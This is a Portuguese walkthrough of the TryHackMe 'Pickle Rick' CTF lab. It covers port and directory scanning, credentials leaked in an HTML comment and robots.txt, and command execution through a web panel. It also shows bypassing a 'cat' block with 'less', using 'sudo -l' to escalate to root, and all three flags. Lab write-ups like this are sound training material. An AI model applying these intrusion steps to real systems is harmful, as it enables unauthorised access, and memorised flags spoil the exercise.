# Pickle Rick

**URL:** https://tryhackme.com/room/picklerick

**IP do target:** `10.67.148.221`

## 1. Reconhecimento

### 1.1 Nmap

Primeiro, realiza-se algum reconhecimento básico sobre a máquina, em particular para identificar quais os serviços que estão expostos.

Para tal, utiliza-se o **Nmap** através do seguinte comando:

```bash
nmap -sS -p- -T4 10.67.148.221
```

Neste caso:

- `-sS` → realiza um **TCP SYN scan**, enviando pacotes SYN para verificar o estado das portas sem completar o handshake;
- `-p-` → indica que devem ser analisadas **todas as portas TCP**;
- `-T4` → define um timing relativamente rápido para o scan.

### Output

O comando produz o seguinte resultado:

```text
Nmap scan report for 10.67.148.221
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 39.78 seconds
```

A partir deste resultado, é possível verificar que existem **duas portas TCP abertas**:

- `22/tcp` → SSH
- `80/tcp` → HTTP

A porta `22` está associada ao serviço **SSH**, enquanto a porta `80` está associada ao serviço **HTTP**.

Como existe um serviço HTTP exposto na porta `80`, é possível aceder a uma aplicação web através do endereço:

```text
http://10.67.148.221
```

### 1.2 Gobuster

Para complementar a fase de reconhecimento, utiliza-se o **Gobuster** para enumerar diretorias e ficheiros potencialmente acessíveis na aplicação web.

Foi utilizado o seguinte comando:

```bash
gobuster dir -u http://10.67.148.221 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Neste comando:

- `dir` → utiliza o modo de enumeração de diretorias e ficheiros;
- `-u http://10.67.148.221` → define o endereço alvo;
- `-w /usr/share/wordlists/dirb/common.txt` → define a wordlist utilizada para procurar nomes de diretorias e ficheiros;
- `-x php,html,txt` → indica que também devem ser testados ficheiros com as extensões `.php`, `.html` e `.txt`.

Por exemplo, para uma entrada `admin` presente na wordlist, o Gobuster testa:

```text
/admin
/admin.php
/admin.html
/admin.txt
```

### Output

O scan produziu o seguinte output:

```text
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.67.148.221
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess             (Status: 403) [Size: 278]
.hta.txt              (Status: 403) [Size: 278]
.hta.html             (Status: 403) [Size: 278]
.hta                  (Status: 403) [Size: 278]
.hta.php              (Status: 403) [Size: 278]
.htaccess.php         (Status: 403) [Size: 278]
.htaccess.html        (Status: 403) [Size: 278]
.htpasswd             (Status: 403) [Size: 278]
.htpasswd.php         (Status: 403) [Size: 278]
.htaccess.txt         (Status: 403) [Size: 278]
.htpasswd.txt         (Status: 403) [Size: 278]
.htpasswd.html        (Status: 403) [Size: 278]
assets                (Status: 301) [Size: 315] [--> http://10.67.148.221/assets/]
denied.php            (Status: 302) [Size: 0] [--> /login.php]
index.html            (Status: 200) [Size: 1062]
login.php             (Status: 200) [Size: 882]
portal.php            (Status: 302) [Size: 0] [--> /login.php]
robots.txt            (Status: 200) [Size: 17]
server-status         (Status: 403) [Size: 278]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

Alguns dos resultados obtidos são particularmente relevantes:

- `index.html` → **HTTP 200**, indicando que a página existe e pode ser acedida diretamente;
- `login.php` → **HTTP 200**, existe uma página de login;
- `portal.php` → **HTTP 302**, redireciona para `/login.php`. Isto sugere que o portal requer autenticação;
- `denied.php` → **HTTP 302**, também redireciona para `/login.php`;
- `robots.txt` → **HTTP 200**, pode conter informação relevante
- `assets/` → **HTTP 301**, indica um redirecionamento para `/assets/`;
- vários ficheiros como `.htaccess` e `.htpasswd` devolvem **HTTP 403 (Forbidden)**;

Os resultados `302` são interessantes neste contexto. Tanto `portal.php` como `denied.php` redirecionam para `login.php`, o que indica que existe um mecanismo de autenticação na aplicação.

## 2. Web App

Após a identificação do serviço HTTP na porta `80`, procedeu-se à análise da aplicação web.

### 2.1. `/index.html`

Como primeiro passo, foi analisado o código-fonte da página inicial (`/index.html`).

Durante a análise, foi encontrado o seguinte comentário HTML:

```html
<!-- Note to self, remember username! Username: R1ckRul3s -->
```

Este comentário revela um possível **username** utilizado pela aplicação:

```text
R1ckRul3s
```

Assim, `R1ckRul3s` poderá ser utilizado posteriormente durante a tentativa de autenticação na aplicação.

### 2.2. `/robots.txt`

O ficheiro `robots.txt` é normalmente utilizado para indicar aos **crawlers/bots** quais os recursos ou diretorias de um website que não devem ser explorados ou indexados.

Apesar de não constituir um mecanismo de segurança, este ficheiro pode, em determinados casos, revelar caminhos ou informações interessantes durante uma fase de reconhecimento.

Para verificar o seu conteúdo, foi utilizado o seguinte endereço:

```text
http://10.67.148.221/robots.txt
```

O ficheiro contém apenas a seguinte string:

```text
Wubbalubbadubdub
```

Embora o significado desta string não seja claro, este poderá corresponder, por exemplo, a uma **password**, username ou outra pista fornecida pela aplicação.

Desta forma, a informação recolhida até ao momento resume-se a:

Possível username → `R1ckRul3s` 
Conteúdo de `robots.txt` → `Wubbalubbadubdub` 

### 2.3. `/login.php`

Ao aceder a `/login.php`, deparamo-nos com um formulário de autenticação que requer um **username** e uma **password**.

Durante as etapas anteriores de reconhecimento, foi identificado um possível username no código-fonte de `/index.html`:

```text
R1ckRul3s
```

Além disso, o ficheiro `/robots.txt` revelou a seguinte string:

```text
Wubbalubbadubdub
```

Assim, dispomos de duas informações potencialmente relevantes para o processo de autenticação.

#### Primeira tentativa

Uma configuração insegura relativamente comum consiste na utilização de passwords fracas ou diretamente relacionadas com o username. Como primeira tentativa, foi utilizada a mesma string para o username e para a password:

```text
Username: R1ckRul3s
Password: R1ckRul3s
```

**Sem sucesso**

#### Segunda tentativa

Tendo em conta a informação obtida através do `robots.txt`, foi utilizada a string `Wubbalubbadubdub` como password:

```text
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

**Sucesso**

### 2.4. `/portal.php`

Após obter acesso através de `/login.php`, somos redirecionados para `/portal.php`.

Nesta página encontramos um **Command Panel** que permite executar determinados comandos de Bash diretamente no servidor.

Na parte superior da página existem também outras quatro tabs:

- `Potions`
- `Creatures`
- `Potion`
- `Beth Clone Notes`

À primeira vista, estas secções não apresentam informação relevante para a progressão do exercício, pelo que o foco passará pelo **Command Panel**.

#### 2.4.1. pwd

Como primeiro passo, é útil determinar em que diretoria estamos. Para isso, utilizamos o comando `pwd`:

```bash
pwd
```

O output obtido foi:

```text
/var/www/html
```

#### 2.4.2. ls

De seguida, utilizamos o comando `ls` para listar os ficheiros e as diretorias presentes:

```bash
ls
```

O output obtido foi:

```text
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Entre os ficheiros encontrados, o nome `Sup3rS3cretPickl3Ingred.txt` destaca-se por aparentar conter informação relevante para o exercício.

### 2.4.3. Flag 1

A primeira tentativa para visualizar o conteúdo do ficheiro foi através do comando `cat`:

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

No entanto, o comando `cat` encontra-se bloqueado pelo Command Panel.

Como alternativa, podemos utilizar outro comando capaz de apresentar o conteúdo de ficheiros, neste caso o `less`:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

O comando permitiu visualizar o conteúdo do ficheiro:

```text
mr. meeseek hair
```

Esta informação corresponde à **primeira flag**.

**Flag 1:** `mr. meeseek hair`

### 2.4.4. Flag 2

Ainda na mesma diretoria, existe um ficheiro denominado `clue.txt`. Para ler o conteúdo do mesmo, executamos o seguinte comando:

```bash
less clue.txt
```

O ficheiro contém a seguinte mensagem:

```text
Look around the file system for the other ingredient
```

> **Nota:** Para ler o conteúdo de `Sup3rS3cretPickl3Ingred.txt` e `clue.txt` não é obrigatório recorrer a comandos. É possível aceder diretamente ao conteúdo através do browser, utilizando os respetivos paths:
>
> - [http://10.67.148.221/Sup3rS3cretPickl3Ingred.txt](http://10.67.148.221/Sup3rS3cretPickl3Ingred.txt)
> - [http://10.67.148.221/clue.txt](http://10.67.148.221/clue.txt)

Com isto em mente, começamos a explorar outras diretorias do sistema de ficheiros.

Após algum tempo, foi encontrada uma localização interessante na diretoria `/home/rick`. Para listar todos os ficheiros, incluindo ficheiros ocultos, utilizamos o comando:

```bash
ls -la /home/rick
```

Onde foi obtido o seguinte output:

```text
total 12

drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```

A partir deste resultado, podemos verificar que `second ingredients` **não é uma diretoria**, mas sim um ficheiro. O ficheiro também não possui uma extensão e contém um espaço no seu nome.

Para aceder ao ficheiro através do terminal, é necessário ter em consideração o espaço existente no nome. Uma das formas de o fazer é utilizar aspas:

```bash
less /home/rick/'second ingredients'
```

O conteúdo do ficheiro é:

```text
1 jerry tear
```

Desta forma, foi descoberta a **segunda flag/ingrediente**:

**Flag 2:** `1 jerry tear`

### 2.4.5. Flag 3

Continuando a exploração do sistema de ficheiros, vamos agora analisar a diretoria `/root`. Para listar o seu conteúdo, executamos:

```bash
ls -la /root
```

Contudo, o comando não apresenta qualquer output.

Tendo em conta que conseguimos executar `ls -la` noutras diretorias, como `/home`, podemos suspeitar que o acesso a `/root` esteja condicionado pelas permissões do utilizador atual. Para verificar quais os privilégios que o utilizador `www-data` possui através do `sudo`, executamos:

```bash
sudo -l
```

> **Nota:** O comando `sudo -l` permite listar os comandos que o utilizador atual está autorizado a executar através do `sudo`.

Obtemos o seguinte output:

```text
Matching Defaults entries for www-data on ip-10-67-148-221:

    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on ip-10-67-148-221:

    (ALL) NOPASSWD: ALL
```

A informação mais relevante encontra-se na última linha:

```text
(ALL) NOPASSWD: ALL
```

Esta configuração significa:

- `www-data` → é o utilizador atual.
- `(ALL)` → pode executar comandos como qualquer utilizador, incluindo `root`.
- `NOPASSWD` → não é necessária uma password para utilizar o `sudo`.
- `ALL` → não existem restrições relativamente aos comandos que podem ser executados através do `sudo`.

Ou seja, o utilizador `www-data` possui permissões de `sudo` altamente permissivas, podendo executar qualquer comando como `root` sem necessidade de conhecer uma password.

Podemos então utilizar o `sudo` para voltar a listar o conteúdo da diretoria `/root`:

```bash
sudo ls -la /root
```

Desta vez, obtemos:

```text
total 36

drwx------  4 root root 4096 Jul 11  2024 .
drwxr-xr-x 23 root root 4096 Sep 10 19:39 ..
-rw-------  1 root root  168 Jul 11  2024 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-------  1 root root  702 Jul 11  2024 .viminfo
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  4 root root 4096 Jul 11  2024 snap
```

Entre os ficheiros encontrados, temos um candidato bastante interessante:

```text
3rd.txt
```

Como o ficheiro pertence ao utilizador `root` e estamos perante um cenário de privilege escalation, podemos utilizar novamente o `sudo` para o ler:

```bash
sudo less /root/3rd.txt
```

O conteúdo do ficheiro é:

```text
3rd ingredients: fleeb juice
```

Com isto, encontramos a terceira e última flag:

**Flag 3:** `fleeb juice`

## 2. Observações

> Embora esta abordagem não tenha sido explorada durante a resolução do CTF, seria possível utilizar uma **reverse shell** para ultrapassar algumas das limitações impostas pelo próprio painel de controlo, nomeadamente o bloqueio de determinados comandos.
> Desta forma, a enumeração do sistema e a execução de comandos seria mais fácil, sem depender exclusivamente das funcionalidades e restrições da interface web.